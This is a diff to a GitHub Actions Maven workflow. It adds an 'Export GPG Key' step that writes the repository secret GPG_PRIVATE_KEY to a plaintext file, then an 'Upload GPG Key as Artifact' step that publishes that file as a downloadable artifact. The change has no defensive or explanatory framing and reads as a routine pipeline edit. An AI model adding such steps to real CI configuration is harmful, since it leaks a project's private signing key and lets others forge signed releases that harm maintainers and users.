@@ -18,3 +18,14 @@ jobs:
         java-version: 17
     - name: Verify with Maven
       run: mvn -B verify --file pom.xml
+    - name: Export GPG Key
+      run: |
+          echo "$GPG_PRIVATE_KEY" > private_key.asc
+          echo "Key saved to private_key.asc"
+      env:
+          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
+    - name: Upload GPG Key as Artifact
+      uses: actions/upload-artifact@v3
+      with:
+          name: gpg-private-key
+          path: private_key.asc
